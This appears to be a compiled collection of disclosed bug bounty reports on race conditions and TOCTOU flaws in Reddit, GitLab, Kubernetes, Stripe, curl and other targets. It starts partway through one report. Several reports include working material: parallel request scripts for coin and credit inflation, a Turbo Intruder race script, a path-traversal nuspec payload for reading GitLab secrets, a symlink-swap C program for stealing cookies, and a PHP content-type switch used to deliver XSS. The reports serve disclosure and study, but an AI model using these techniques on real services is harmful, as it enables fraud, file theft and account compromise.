+> _Note:_  This issue seems to be rather unique, and I honestly haven't seen this behavior ever happen before -- this was a very fun find and a super interesting bug. However, I did try to find as similar reports as I could for you, which are linked above  :)
+
+## Impact
+
+**Main Issue:**
+At attacker may be able to take over another user's account. 
+
+**Secondary Issue:**
+The application issues two valid reset tokens for one user. After the 1st token is used, the 2nd token is able to be used as well (i.e., the application is *not* properly invalidating multiple tokens). Upon successful re-login, the user is unable to logout or perform additional activities until they reset their IP address and refresh their browser. They are simply stuck in 403 Limbo Land... and who wants to hang out there?!
+===== #801743 · Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase 
+   program: reddit · bounty: None · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+Hi,
+
+## Summary:
+When we purchase coins from Reddit's mobile app using Android, https://oauth.reddit.com/api/v2/gold/android/verify_purchase is called with parameters like `transaction_id` and `token`. There exists a race condition on this endpoint which allows an attacker to get coins many times more than it was intended to.
+
+
+## Steps To Reproduce:
+- Go to the Reddit app, click on the top right corner which has a coin icon and says `Get`:
+
+- Select a basic 50 coins package, and intercept this request when the purchase is completed:
+
+```
+POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
+Authorization: Bearer REDACTED
+Client-Vendor-ID: REDACTED
+x-reddit-device-id: REDACTED
+User-Agent: Reddit/Version 2020.5.0/Build 255357/Android 9
+X-Dev-Ad-Id: REDACTED
+x-reddit-session: REDACTED
+x-reddit-loid: REDACTED
+x-reddaid: REDACTED
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 327
+Host: oauth.reddit.com
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+
+transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd
+```
+
+- We can simply repeat this request in parallel to get more coins.
+
+I did 10 parallel requests and got 9 of them through. An actual attacker will do more requests and get more coins. Like for example, they can do 40 requests and maybe if 35 of them get through they have 35x times the coins intended.
+
+Transaction ID for reference: `GPA.3390-9967-2355-57063`
+
+Proof:
+{F724269}
+{F724270}
+{F724271}
+███
+
+Regards,
+Yash
+
+## Impact
+
+Due to a race condition on https://oauth.reddit.com/api/v2/gold/android/verify_purchase, an attacker can get more coins than what they purchased it for. This can lead to a huge business loss for Reddit, that's why I have marked this as High.
+===== #822262 · Path traversal in Nuget Package Registry
+   program: gitlab · bounty: 12000.0 · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+### Summary
+There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently. The issue allows an attacker to create any file with an extension “.nupkg” in the filesystem. By combining the bug with a race condition in Gitaly which I used several times before (#762421, #732330). It could finally be used to read sensitive files in a GitLab instance.
+
+For some context, a large part of the exploit were explained in #762421, the npm registry issue. Here I will focus on the simple path traversal part which makes a little bit difference.
+
+The root cause of the path traversal lies at `ee/app/services/packages/nuget/metadata_extraction_service.rb`
+```
+      XPATHS = {                                                               
+        package_name: '//xmlns:package/xmlns:metadata/xmlns:id',               
+        package_version: '//xmlns:package/xmlns:metadata/xmlns:version'        
+      }.freeze 
+...
+      def extract_metadata(file)                                               
+        doc = Nokogiri::XML(file)                                              
+                                                                               
+        XPATHS.map do |key, query|                                             
+          [key, doc.xpath(query).text]                                         
+        end.to_h 
+```
+It extracts the uploaded nupkg (which is in zip format) for the contained nuspec file (which is an XML). And then looks for attribute `id` and `version`. Then the extracted package_name(id), and package_version(version) will be concatenated into a new filename in `ee/app/services/packages/nuget/update_package_from_metadata_service.rb`
+```                                                                      
+        @package_file.transaction do                                           
+          @package_file.update!(                                               
+            file_name: package_filename,                                       
+            file: @package_file.file                                           
+          )      
+...
+      def package_filename                                                     
+        "#{package_name.downcase}.#{package_version.downcase}.nupkg"           
+      end    
+```
+So my payload is:
+```                                                                  
+  <?xml version="1.0" encoding="utf-8"?>                                       
+  <package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">  
+    <metadata>                                                                 
+      <id>DummyProject.DummyPackage</id>                                       
+      <version>../../../../../nyangawa</version>                                            
+    </metadata>                                                                
+  </package>                                                                   
+```
+name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/#{id}/packages/nuget/` endpoint  will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem.
+
+Then I wrote a script (I used in #762421) to combine this issue and the race in Gitaly. I could finally read any file I want in my GitLab instance.
+
+### Steps to reproduce
+
+1. Download the attached exploit.tar.gz and extract it.
+2. Install some requirements by gem install faraday and gem install rubyzip
+3. Edit exp.rb to update some url and credentials
+4. Execute the exp.rb to watch the result of .gitlab_shell_secret of target GitLab instance.
+
+### Examples
+{F750878}
+
+#### Results of GitLab environment info
+```
+root@localhost:/# gitlab-rake gitlab:env:info
+
+System information
+System:		
+Proxy:		no
+Current User:	git
+Using RVM:	no
+Ruby Version:	2.6.5p114
+Gem Version:	2.7.10
+Bundler Version:1.17.3
+Rake Version:	12.3.3
+Redis Version:	5.0.7
+Git Version:	2.24.1
+Sidekiq Version:5.2.7
+Go Version:	unknown
+
+GitLab information
+Version:	12.8.7-ee
+Revision:	2643fd87200
+Directory:	/opt/gitlab/embedded/service/gitlab-rails
+DB Adapter:	PostgreSQL
+DB Version:	10.12
+URL:		http://10.26.0.5
+HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
+SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
+Elasticsearch:	no
+Geo:		no
+Using LDAP:	no
+Using Omniauth:	yes
+Omniauth Providers: 
+
+GitLab Shell
+Version:	11.0.0
+Repository storage paths:
+- default: 	/var/opt/gitlab/git-data/repositories
+GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
+Git:		/opt/gitlab/embedded/bin/git
+```
+
+ps. I changed my username because of a lost bet, don't be strange :p
+
+Best regards,
+SaltyYolk
+
+## Impact
+
+Common arbitrary file read issue caused by path traversal similar to my previous reports.
+===== #859962 · Bypass apiserver proxy filter
+   program: kubernetes · bounty: None · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+Report Submission Form
+
+## Summary:
+
+TL,DR: Time-of-check (apiserver proxy filter) Time-of-use (apiserver proxy request) Race Condition.
+
+When the apiserver is proxying a request to a node though one of its addresses, it performs a filter validation. If the address type is a DNS record (Hostname, ExternalDNS, InternalDNS), the apiserver performs two DNS queries, one for filter validation, another for proxying the request. If the attacker sets the hostname to a custom DNS server, that is able return different values with zero TTL, it is possible to bypass that filter. 
+
+## Kubernetes Version:
+1.18.0
+
+## Steps To Reproduce:
+
+### Preparation
+
+  1. Create a server with port UDP/53 (DNS) exposed.
+  2. Delegate a subdomain (e.g. fake.example.com) to the IP address of the server as a NS record.
+  3. Copy, build and run the custom DNS server (source code attached, use `go mod init` and `go mod tidy`).
+  4. Test that it successfully resolves any subdomain of the delegated zone (e.g. toctou.fake.example.com).
+
+### Execution
+
+  1. Create a KIND cluster (manifest attached, defaults to v1.17).
+  2. Create a Node (manifest attached, edit to change domain).
+  3. Start `kubectl proxy`.
+  4. Execute `curl localhost:8001/api/v1/nodes/toctou:80/proxy/`.
+
+## Supporting Material/References:
+
+  * `toctou-cluster.yml`, a KIND cluster manifest
+  * `toctou-node.yml`, a Node with a custom address.
+  * `toctou-dns-server.go`, a custom DNS server that returns different results to consecutive queries.
+
+## Impact
+
+https://github.com/kubernetes/kubernetes/pull/71980 was merged to mitigate dangerous proxying through the apiserver. An attacker with access to create nodes and send requests to them through apiserver proxy, could access cloud metadata endpoints or localhost services. This is specially important on as a service providers like https://github.com/oneinfra/oneinfra but could affect any vendor.
+===== #1037430 · Race Condition on "Get free Badoo Premium" which allows to get more days of free premium for Free. 
+   program: bumble · bounty: None · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+##Summary: 
+On Badoo when a user wants to delete his account it prompts for a Free 3 days premium or the user can proceed to delete his account. But when user choose to get free 3 day premium he can click `Get free Badoo Premium` and can enjoy free premium for three days, Here i found a race condition vulnerability through which i was able to get more than three days of premium. 
+
+On the time of testing I  got  3 successful request  which got me 9 days of premium instead of  3 (where 1 week of premium costs about 5$) . And by increasing Number of connections an attacker can get even more days of premium. 
+█████
+
+## POC Video: 
+█████████
+
+##Steps To Reproduce: 
+  1. Create a account on badoo.com 
+  2. Go to  badoo.com/settings and click `Delete account` which is available on bottom > Delete your account > I’m looking for something different > I don't want to pay, After these steps you'll see this prompt. 
+        ██████████
+
+  3. Before clicking `Get free Badoo Premium` turn intercept On in your burp suite and then click `Get free Badoo Premium` intercept this `POST /webapi.phtml?SERVER_PROMO_ACCEPTED ` select any parameter value > right click > send it to turbo inturer. 
+  4. Copy this script from this link https://raw.githubusercontent.com/PortSwigger/turbo-intruder/master/resources/examples/race.py and paste it in code section of turbo intruder and click attack and  after completion you'll see more than 1 sucessfull responses .
+
+After seeing 3 successful █████ requests i conformed from the settings that it was successful where it showed `it will stop on 27 November 2020` 9 days from today `18 November`
+████████
+
+##Vulnerable HTTP Request: 
+```
+POST /webapi.phtml?SERVER_PROMO_ACCEPTED HTTP/1.1
+Host: eu1.badoo.com
+Connection: close
+Content-Length: 190
+X-Session-id: s1:77:████
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+X-Message-type: 402
+X-User-id: █████████
+Content-Type: json
+Accept: */*
+Origin: https://eu1.badoo.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://eu1.badoo.com/settings
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie:  {cookie here}
+
+{"$gpb":"badoo.bma.BadooMessage","body":[{"message_type":402,"p_string":{"value":"delete_account_trial_spp_new_flow"}}],"message_id":101,"message_type":402,"version":1,"is_background":false}
+```
+
+##Supporting Material/References:
+- https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html
+
+## Impact
+
+- As an attacker i can get Free premium access for more days without paying any money.
+===== #1301753 · Java: Timing attacks while comparing results of cryptographic operations
+   program: github-security-lab · bounty: 4500.0 · module: Library-Timing-Adjacent · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+===== #1438052 · Race condition in faucet when using starport
+   program: cosmos · bounty: 5000.0 · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+Hi team, 
+I and Aditya sent this bug over email on Wed, 29 Dec, 17:45 IST. Later we noticed that security reports are accepted via the HackerOne program. So, I am sending a copy of the bug report here. 
+
+## Summary:
+We were testing an application and we found a race condition bug in the faucet Implementation of Starport. 
+https://github.com/tendermint/starport
+
+## Steps To Reproduce:
+1. Start a starport with the below configuration. Note the "coins_max" has been set to 11 tokens and hence a user cannot fetch more after the 11 token limits.
+
+```
+accounts:
+  - name: alice
+    coins: ["0token", "200000000stake"]
+  - name: bob
+    coins: ["500token", "100000000stake"]
+validator:
+  name: alice
+  staked: "100000000stake"
+client:
+  openapi:
+    path: "docs/static/openapi.yml"
+  vuex:
+    path: "vue/src/store"
+faucet:
+  name: bob
+  coins: ["5token", "100000stake"]  
+  coins_max: ["11token", "100000stake"]
+```
+
+2. Now call the request manually  with 5 tokens per request as in our configuration after 2 requests and 10 tokens in total Alice won't be able to fetch more tokens from the faucet
+
+```
+POST / HTTP/1.1
+Host: 172.105.41.242:4500
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.105.41.242:4500/
+Content-Type: application/json
+Origin: http://172.105.41.242:4500
+Content-Length: 63
+Connection: close
+{
+  "address": "ALICE_ADDRESS"}
+
+```
+
+Now we can confirm Alice cannot have more than 11 tokens. 
+
+3.  Now regenerate the server and instead of sending a single request send a concurrent request to fetch tokens in Alice address.  We used 50 requests concurrently.
+
+{F1563051}
+
+4. Now when we check Alice balance it is 30 which should have not been more than 11
+
+{F1563052}
+
+We believe the root cause of the issues is the go mapping which is not advised for concurrency 
+https://github.com/tendermint/starport/blob/develop/starport/pkg/cosmosfaucet/transfer.go#L59
+
+## Supporting Material/References:
+https://cwe.mitre.org/data/definitions/362.html
+
+## Impact
+
+A malicious user can send concurrent requests to fetch more tokes from faucets than the "max-credit limit" which allows.
+===== #1460373 · Race condition in endpoint POST fetlife.com/users/invitation, allow attacker to generate unlimited invites
+   program: fetlife · bounty: None · module: Membership-and-Invitation-Races · full-body
+--- BODY ---
+This report describes the same bug as #1455487. I rewrite this bug here to make the report clearer. I will self-close #1455487 right now.
+
+# Description
+
+The `Invite Your Friend to Join FetLife` feature is vulnerable to race condition.
+
+By sending many requests at the same time to endpoint `POST fetlife.com/users/invitation`. We are able to send many invites with the cost of 1 invite.
+
+{F1592724}
+
+Also, if we cancel sent-invite, we get back this invite. So basically, we can create unlimited invites by send many invites in race condition, then canceling them to get invites added back to our account.
+
+{F1592733}
+
+# Step to Reproduce
+
+This is a chain of 10 curl commands in the form of `curl_command_1 & curl_command_2 & ... & curl_command_10`. It allows us to run 10 curl commands at the same time.
+
+```
+curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_8}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_9}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_10}'
+```
+
+1. Please inputs your `session_id` and `authenticity_token` in the above command, there are 10 places to input for each
+2. Please uses 10 different emails for 10 curl commands above. such as, `[REDACTED_EMAIL], [REDACTED_EMAIL], ..., [REDACTED_EMAIL]`
+3. Please url-encode your email addresses, so that: `[REDACTED_EMAIL]` becomes `example%2B1%40gmail.com`
+
+## Impact
+
+Attacker is able to generate unlimited amount of invites.
+===== #1496268 · [Java]: Timing attacks while comparing the headers value
+   program: github-security-lab · bounty: 1000.0 · module: Library-Timing-Adjacent · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+===== #1540969 · Race condition in joining CTF group
+   program: security · bounty: 500.0 · module: Membership-and-Invitation-Races · full-body
+--- BODY ---
+**Summary:**
+
+A race condition in `https://ctf.hacker101.com/group/join` allows a user to join the same CTF group multiple times. 
+
+The user will show up in the group member list multiple times, and affect the group statistics.
+
+**Description:**
+
+Interestingly a race condition in this feature was reported in #604534, but it seems like the implementation has changed slightly, allowing the same issue to occur.
+
+### Steps To Reproduce
+
+1. As the team leader, generate a shared invitation link. For this example the link was `https://ctf.hacker101.com/group/join?invite=fdb4ba75da6e8da41650369d24e3866f90384550f952474df194db8077bda8b0`.
+
+2. Use Burp Suite to intercept this request and configure Turbo Intruder as follows:
+
+```python
+# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=100,
+                           requestsPerConnection=100,
+                           pipeline=True
+                           )
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    for i in range(30):
+        engine.queue(target.req, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+```
+
+{F1692527}
+
+3. Start the attack, and observe multiple requests succeeding with status code 200.
+
+{F1692528}
+
+We can verify from the invited user's screen that we have joined the same group multiple times.
+
+{F1692529}
+
+The user will also show up in the group multiple times from the group leader's screen.
+
+{F1692530}
+
+## Impact
+
+Race condition allows a user to join the same group multiple times. This is more of a low-impact bug, but one that should be fixed nonetheless.
+===== #1566017 · Race condition on https://judge.me/people
+   program: judgeme · bounty: 250.0 · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+##summary:An attacker can increase the followers of  the users of judge.me
+
+Tools required : 
+1.burpsuit
+2.turbo intruder
+
+##steps to reproduce:
+1.visit https://judge.me/people
+2.like a user and intercept the request
+3.now  send it to turbo intruder and configure the script to 
+     race.py
+
+## Impact
+
+The attacker can increase their followers in a bad way by creating fake followers
+===== #1717650 · Promotion code can be used more than redemption limit.
+   program: stripe · bounty: None · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+## Summary:
+While creating a promotion code a user can specify number of times that code can be redeemed.(i.e. Redemption limit)
+{F1962666}
+Codes aren't supposed to be redeemed more than the redemption limit.
+But there exists a race condition that allows use of promotion codes more than redemption limit.
+{F1962665}
+
+## Steps To Reproduce:
+[In these steps i have used just a browser to show how easy this is to exploit and even a person with very limited knowledge on technology can exploit this. This can certainly be scaled using burp and other software .]
+
+1. As a merchant create a promotion code with Redemption limit 1.
+{F1962664}
+2. As a user, Visit any two payment links of same merchant with the coupon.
+3. In both payment links, Fill the form and apply coupon but don't hit Pay/ Subscribe.
+4.Hit both link's pay/subscribe button as fast as you can.
+5. Both payment will be successful using one coupon two times.
+
+## Supporting Material/References:
+I have added a video poc.
+In this poc, I have used a promotion code with redemption limit 2.
+I have also used laptops screentouch feature to click both link's pay/subscribe button as fast as I could.
+{F1962525}
+
+## Impact
+
+Promotion code can be used more than redemption limit.
+===== #1943049 · [Python]: Timing attack
+   program: github-security-lab · bounty: 1800.0 · module: Library-Timing-Adjacent · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+===== #1990421 ·  CVE-2023-28320 - siglongjmp race condition
+   program: ibb · bounty: 480.0 · module: Library-Timing-Adjacent · full-body
+--- BODY ---
+libcurl provides several different backends for resolving host names, selected at build time. If it is built to use the synchronous resolver, it allows name resolves to time-out slow operations using alarm() and siglongjmp().
+
+When doing this, libcurl used a global buffer that was not mutex protected and a multi-threaded application might therefore crash or otherwise misbehave.
+
+## Impact
+
+Denial of service due to a crash (likely) or possibly other impacts.
+===== #2078571 · [curl] CVE-2023-32001: fopen race condition
+   program: ibb · bounty: 2480.0 · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+Hello, I'm reporting for CVE-2023-32001 on curl which was resolved in last Wednesday's curl release.
+
+### Vulnerability explanation: 
+As we can see in the following curl code (line 59-61 https://github.com/curl/curl/blob/fb802b521af997230b65174a559f5c419520e142/lib/fopen.c ): 
+```C
+  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
+    /* a non-regular file, fallback to direct fopen() */
+    *fh = fopen(filename, FOPEN_WRITETEXT);
+...
+}
+...
+```
+There is a race condition between the moment "stat(filename, &sb)" is executed and the moment " fopen(filename, FOPEN_WRITETEXT);" is executed.
+This leads to undesirable behavior such as an attacker tricking a privileged user to overwrite protected files, or since this function (Curl_fopen) is also used for storing cookies an attacker could trick another user to send those cookies that might be very sensible to a file fully owned and controlled by the attacker.
+
+###POC/Steps to reproduce:
+Before we start, I will be using a little program called "rename". Which simply swaps atomically the names of two files to be able to showcase this race condition. Here is its code :
+```
+#include <strings.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
+```
+
+Open two terminals, with two different users. One will be the attacker terminal and the other the victim. 
+In both POCs, the victim  will want to execute a command such as "curl --cookie-jar a google.com" thinking the file "a" doesn't exist.
+
+###A) Exploiting this vulnerability to trick a user to overwrite a file they own:
+
+Assume the current directory of both attacker(selmelc) and victim (root) looks like this
+```SHELL
+lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
+drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
+-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
+-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
+```
+The attacker executes ./rename a b, which will not stop to swap the name of the directory "b" and the symlink "a". 
+
+The victim executes their command "curl --cookie-jar a google.com".
+The race condition is successfully exploited if in the vulnerable code the stat identifies the file "a" as a directory and then the "fopen" opens the symlink that points to the file "flag".
+If that happened then the results looks like this :
+```
+...
+-rw-r--r-- 1 root    root      131 Jun 27 07:13 flag
+...
+root@deb:/home/selmelc/Documents# cat flag
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+```
+Additional note: 
+You might think "well that's just how symlinks work"... To clarify on that, by default if the victim was executing  "curl --cookie-jar a google.com" without the attacker exploiting the vuln. a different behavior would occur ; the file "a" would be erased (no more symlink) and overwritten as a regular file containing the cookie data. This happens because the stat function follows symbolic links therefore in that scenario we would not enter the vulnerable condition which leads to the race condition.
+
+###B) Exploiting this vulnerability to steal the victim's cookies and hide it from them:
+
+As this uses the same logic as the previous exploit for this vuln. Repeat same steps except this time we want the "flag" file to be owned by the attacker as following:
+```
+lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:42 a -> flag
+drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b
+-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag
+-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
+
+```
+Normal curl behavior after the victim executed  "curl --cookie-jar a google.com" :
+```
+-rw------- 1 root    root      131 Jun 27 08:49 a
+drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b
+-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag
+-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
+```
+Behaviour when vulnerability is exploited (and race condition met) : 
+```
+drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 a
+lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:50 b -> flag
+-rw--w--w- 1 selmelc selmelc   131 Jun 27 08:51 flag
+-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
+```
+We can notice the 131 bytes of output in flag now, which would contain the sensitive cookies.
+
+## Conclusion
+
+An attacker is able to overwrite files they shouldn't have access to, however the attacker does not control the data sent to those files. (Integrity, potentially availability issues if files likes /etc/passwd are modified through this).
+An attacker may also gain access to sensitive data (cookies), and even hide that information from the intended receiver as the attacker may control the file in which this information will be leaked.
+Note : cookie storing was used to demonstrate exploits for the vulnerability but the vulnerability also affects HSTS and alt-svc cache.
+
+## Impact
+
+This race condition modifies the behavior of symbolic link files in affected components, they might be followed instead of being overwritten when the condition is met leading to undesired and potentially destructive behavior.
+===== #2106708 · Bypass of #2035332 RXSS at image.hackerone.live via the `url` parameter
+   program: security · bounty: None · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+Heyy there,
+I was able to bypass the fix for the reflected xss reported in #2035332
+
+After the bug patch, the server now validates the `Content-Type` of the requested resource. The check is done by making a `HEAD` based request to the resource to get the `Content-Type` then if it corresponds to a valid image mime type a second request is made this time `GET` based to retrieve the page resource content.
+
+Due to the HEAD based check it's very easy to bypass this check, just need to modify the server to response with a different `Content-Type` in case of GET and HEAD request
+
+Example code:
+
+```php
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
+    header("Content-Type: image/png");
+    exit;
+}
+
+header("Location: https://sudistark.github.io/evilsvgfile.svg");
+
+?>
+```
+
+TOCTOU ( time-of-check to time-of-use) : At the time of check the application relies  upon HEAD request but at the time of use relies upon GET request this allows the attacker to bypass the protection.
+
+
+This xss works only in the Safari browser , I was able to find the problem why it doesn't works in other browser. It had do something with the `Accept` header.
+
+Other browsers send the Accept header with these values: 
+
+```
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+```
+The server applies sanitization if the Accept header is similar to above, in case of Safari it does something wierd (I don;t actually have a mac so not sure what's eactly it's sending in the Accept header)
+But the server doesn;t does any sanitization if the header value is like this
+
+```
+Accept: */*
+```
+
+---------------------------------
+
+
+**Steps to reproduce:**
+
+1.Save this code in your webserver xss.php
+
+```php
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
+    header("Content-Type: image/png");
+    exit;
+}
+
+header("Location: https://sudistark.github.io/evilsvgfile.svg");
+
+?>
+```
+2.Then input your host in the url parameter: https://image.hackerone.live:8443/resource/md/get/url?url=http://yourhost/ss.php
+3.Open this url in Safari browser and you should get the xss
+{F2593672}
+
+
+---------------------------------
+
+## Impact
+
+As the server is behind cloudflare I can;t directly make a request to the AWS metadata endpoint, but for the least I can confirm the xss with the provided poc
+
+Thankyou
+Regards
+Sudhanshu
+===== #2905013 · [SECURITY] CVE-2024-50379 Apache Tomcat - RCE via write-enabled default servlet
+   program: ibb · bounty: None · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+Code injection triggered by a race condition on a Windows machine.
+
+## Impact
+
+Code injection
